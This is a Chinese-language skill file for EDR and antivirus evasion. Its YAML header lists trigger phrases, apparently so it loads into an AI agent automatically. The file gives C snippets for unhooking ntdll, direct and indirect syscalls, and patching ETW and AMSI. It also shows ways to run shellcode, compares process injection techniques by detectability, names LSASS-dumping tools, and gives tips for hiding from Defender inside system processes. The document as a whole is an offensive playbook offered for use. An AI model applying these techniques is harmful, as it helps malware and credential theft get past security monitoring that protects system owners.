---
name: edr-av-evasion
description: EDR/AV 对抗 — unhook、direct/indirect syscall、ETW/AMSI patch、call stack spoofing、进程注入、Shellcode 执行
category: reverse-engineering
triggers:
  - EDR 绕过
  - AV 绕过
  - 杀软对抗
  - unhook
  - direct syscall
  - ETW patch
  - AMSI bypass
  - shellcode loader
  - process injection
  - call stack spoofing
  - Hell's Gate
  - Tartarus Gate
---

# EDR/AV 对抗

来源：GitHub 搜寻补全（2025-2026 最新）。

## 核心工具链

| 工具 | 用途 | 仓库 |
|------|------|------|
| **SysWhispers4** | Direct/Indirect syscall 生成，支持 x64/x86/WoW64/ARM64 | github.com/JoasASantos/SysWhispers4 |
| **Hell's Gate** | 动态解析 syscall number，绕过 hook | 经典技术 |
| **Tartarus' Gate** | Hell's Gate 改进版，解析更稳定的 syscall stub | 同上 |
| **Halo's Gate** | 邻居 syscall 恢复（当目标被 hook 时从相邻函数找 syscall） | 同上 |
| **FOLIAGE** | Sleep 加密 + ROP 栈伪造 | github.com/SecIdiot/FOLIAGE |
| **PoolParty** | 利用 Windows 线程池变种注入 | 经典技术 |
| **Nanodump** | 最小化 LSASS dump，绕过 Defender | github.com/fortra/nanodump |
| **Inline-Execute-PE** | 内存加载 PE，不落地执行 | github.com/Octoberfest7/Inline-Execute-PE |

## 绕过层级

### Level 1: Unhook DLL

```c
// 重新加载 ntdll.dll 从磁盘（绕过 EDR 的 inline hook）
HANDLE hNtdll = CreateFileW(L"\\??\\C:\\Windows\\System32\\ntdll.dll", ...);
HANDLE hSection = CreateFileMapping(hNtdll, ...);
LPVOID pNtdllMap = MapViewOfFile(hSection, ...);

// 从 clean ntdll 中读取 syscall stub，替换被 hook 的版本
memcpy(hooked_func, clean_func, stub_size);
```

**检测**：EDR 用 ETW 监控 `MapViewOfFile` 调用 → 需要 Level 2。

### Level 2: Direct Syscall

```c
// SysWhispers4 生成的 syscall stub（不经过 ntdll.dll）
// 绕过所有 userland hook
NtAllocateVirtualMemory_syscall(GetCurrentProcess(), &addr, 0, &size, 
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

**检测**：EDR 用内核回调（PsSetCreateProcessNotifyRoutine）+ ETW 检测非 ntdll 调用的 syscall。

### Level 3: Indirect Syscall + Call Stack Spoofing

```c
// 用 gadget（jmp [rax]）间接调用 syscall，call stack 看起来合法
// syscall stub 地址指向 ntdll 的合法代码段
__asm {
    mov r10, rcx
    mov eax, SSN    // syscall number
    jmp qword ptr [gadget_addr]  // jmp 到 ntdll 内的 syscall 指令
}
```

### Level 4: ETW + AMSI Patch

```c
// Patch EtwEventWrite（禁止 ETW 日志）
// 方法：找到 EtwEventWrite 地址 → 写入 ret 指令
unsigned char patch[] = { 0xC3 };  // ret
WriteProcessMemory(GetCurrentProcess(), EtwEventWrite, patch, 1, NULL);

// AMSI bypass（禁止脚本扫描）
// Patch AmsiScanBuffer → 返回 AMSI_RESULT_CLEAN
// 或设置 AMSI 为 0（Patching amsi.dll!AmsiInitialize）
```

**现代 EDR 对抗（2026）**：
- ETW 在内核级也有 provider → 仅 patch userland 不够
- Call stack spoofing 结合 Sleep 加密（FOLIAGE）→ 内存扫描绕过
- Hardware breakpoint unhook → 检测 inline hook 后动态恢复

## 进程注入技术

| 技术 | 原理 | 检测难度 |
|------|------|----------|
| **Classic CreateRemoteThread** | 远程线程注入 | ⭐ 必杀 |
| **Process Hollowing** | 创建挂起进程 → 替换内存 → 恢复 | ⭐⭐ |
| **APC Injection** | 异步过程调用注入 | ⭐⭐ |
| **Thread Hijacking** | 劫持现有线程执行 shellcode | ⭐⭐⭐ |
| **PoolParty** | Windows 线程池 worker factory | ⭐⭐⭐ |
| **Module Stomping** | 覆盖已加载 DLL 的 .text 段 | ⭐⭐⭐ |
| **Transacted Hollowing** | 事务 NTFS 替换 | ⭐⭐⭐⭐ |

## Shellcode 执行方式

```c
// 1. VirtualAlloc + 直接执行（最易检测）
LPVOID exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, size);
((void(*)())exec)();

// 2. 回调函数执行（稍隐蔽）
EnumFontsW(hdc, NULL, (FONTENUMPROCW)shellcode_addr, 0);

// 3. Fiber 执行（更隐蔽）
LPVOID fiber = ConvertThreadToFiber(NULL);
LPVOID shellcode_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)shellcode_addr, NULL);
SwitchToFiber(shellcode_fiber);

// 4. ROP 链 + VirtualProtect（最隐蔽）
// 用 gadget 链调用 VirtualProtect → 设置 PAGE_EXECUTE → 跳转
```

## 安全工具检测规避

```bash
# 检测 EDR/AV 进程
tasklist | findstr /i "MsMpEng SentinelAgent CrowdStrike CarbonBlack Cylance"

# 规避 Defender 扫描
# 1. 修改 shellcode 熵值（添加垃圾指令）
# 2. 分块写入内存（不一次性分配 RWX）
# 3. 用合法进程做注入宿主（explorer.exe / svchost.exe）
```

## 实战注意事项

1. **x86 vs x64**：syscall number 不同，32位用 `int 0x2E` 或 WoW64 转换
2. **Windows 版本**：syscall number 随版本变化，动态解析比硬编码好
3. **ETW 内核级**：Windows 10 1809+ 内核 ETW 监控 syscall → 仅 patch userland 不够
4. **回调检测**：EDR 用 `PsSetCreateThreadNotifyRoutine` 监控线程创建 → 用线程池或劫持绕过
